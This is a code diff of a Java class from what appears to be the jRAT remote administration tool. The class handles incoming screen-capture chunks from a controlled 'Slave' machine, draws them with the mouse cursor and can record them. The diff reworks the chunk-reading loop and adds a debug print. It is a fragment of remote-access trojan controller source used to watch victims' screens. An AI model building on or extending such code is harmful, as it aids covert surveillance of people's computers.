@@ -18,14 +18,12 @@ import pro.jrat.threads.ThreadRemoteScreenRecorder;
 import pro.jrat.ui.frames.FrameRemoteScreen;
 import pro.jrat.utils.ImageUtils;
 
-
-
 public class Packet17RemoteScreen extends AbstractIncomingPacket {
 
 	public boolean requestAgain = true;
 	public static final HashMap<Slave, RemoteScreenData> instances = new HashMap<Slave, RemoteScreenData>();
 	public static Image MOUSE_CURSOR;
-	
+
 	static {
 		try {
 			MOUSE_CURSOR = ImageIO.read(Main.class.getResource("/icons/mouse_pointer.png"));
@@ -38,12 +36,12 @@ public class Packet17RemoteScreen extends AbstractIncomingPacket {
 	public void read(Slave slave, DataInputStream dis) throws Exception {
 		int w = slave.readInt();
 		int h = slave.readInt();
-		
+
 		int mouseX = slave.readInt();
 		int mouseY = slave.readInt();
-		
+
 		RemoteScreenData itd = instances.get(slave);
-		
+
 		if (itd == null) {
 			itd = new RemoteScreenData(slave, w, h);
 			instances.put(slave, itd);
@@ -54,51 +52,53 @@ public class Packet17RemoteScreen extends AbstractIncomingPacket {
 		if (frame != null && frame.running) {
 			try {
 				Graphics imageGraphics = bufferedImage.getGraphics();
-				
+
 				int rows = frame.rows;
-		        int cols = frame.cols;  
-		  
-		        int chunkWidth = w / cols; 
-		        int chunkHeight = h / rows;  
-		        
-		        frame.progressBar.setMaximum(rows * cols);	
-		        frame.progressBar.setValue(0);
+				int cols = frame.cols;
+
+				int chunkWidth = w / cols;
+				int chunkHeight = h / rows;
+
+				frame.progressBar.setMaximum(rows * cols);
+				frame.progressBar.setValue(0);
+
+				int size = 0;
+
+				// for (int x = 0; x < rows; x++) {
+				// for (int y = 0; y < cols; y++) {
+				itd.setChunks(itd.getChunks() + 1);
+				//if (slave.readBoolean()) {
+					itd.setUpdatedChunks(itd.getUpdatedChunks() + 1);
+
+					int blen = slave.readInt();
+
+					int x = slave.readInt();
+					int y = slave.readInt();
 					
-		        int chunks = 0;
-		        int updatedChunks = 0;
-		        int size = 0;
-		        
-				for (int x = 0; x < rows; x++) {  
-		            for (int y = 0; y < cols; y++) {  
-		            	chunks++;
-		            	if (slave.readBoolean()) {		  
-		            		updatedChunks++;
-		            		int blen = slave.readInt();
-							byte[] buffer = new byte[blen];
-							slave.getDataInputStream().readFully(buffer);
-							
-							//buffer = Crypto.decrypt(GZip.decompress(buffer), slave.getConnection().getKey());
-							
-							BufferedImage image = ImageUtils.decodeImage(buffer);						
-							imageGraphics.drawImage(image, chunkWidth * y, chunkHeight * x, null);	
-							
-							Traffic.increaseReceived(slave, blen);
-							frame.lbl.repaint();		
-							frame.lbl.revalidate();
-							frame.progressBar.setValue(frame.progressBar.getValue() + 1);
-							frame.setLatestChunkSize(blen);
-							frame.setUpdatedChunks(updatedChunks);
-							size += blen;
-		            	}	
-		            	frame.setTotalChunks(chunks);
-		            }
-				}
-				
+					System.out.println(x + ", " + y);
+
+					byte[] buffer = new byte[blen];
+					slave.getDataInputStream().readFully(buffer);
+
+					// buffer = Crypto.decrypt(GZip.decompress(buffer),
+					// slave.getConnection().getKey());
+
+					BufferedImage image = ImageUtils.decodeImage(buffer);
+					imageGraphics.drawImage(image, chunkWidth * y, chunkHeight * x, null);
+
+					Traffic.increaseReceived(slave, blen);
+					frame.lbl.repaint();
+					frame.lbl.revalidate();
+					frame.progressBar.setValue(frame.progressBar.getValue() + 1);
+					frame.setLatestChunkSize(blen);
+					size += blen;
+				//}
+
 				imageGraphics.drawImage(MOUSE_CURSOR, mouseX, mouseY, 16, 16, null);
 				frame.lbl.repaint();
 
 				frame.setSize(size);
-				
+
 				frame.getFPSThread().increase();
 
 				if (frame.record) {
@@ -110,15 +110,13 @@ public class Packet17RemoteScreen extends AbstractIncomingPacket {
 					frame.icon.setImage(imageicon.getImage());
 					itd.setIcon();
 				}
-				
+
 				System.gc();
-			
-				
+
 				if (requestAgain) {
 					new ThreadImage(frame.getDelay(), slave).start();
 				}
 
-				
 			} catch (Exception ex) {
 				ex.printStackTrace();
 				System.gc();
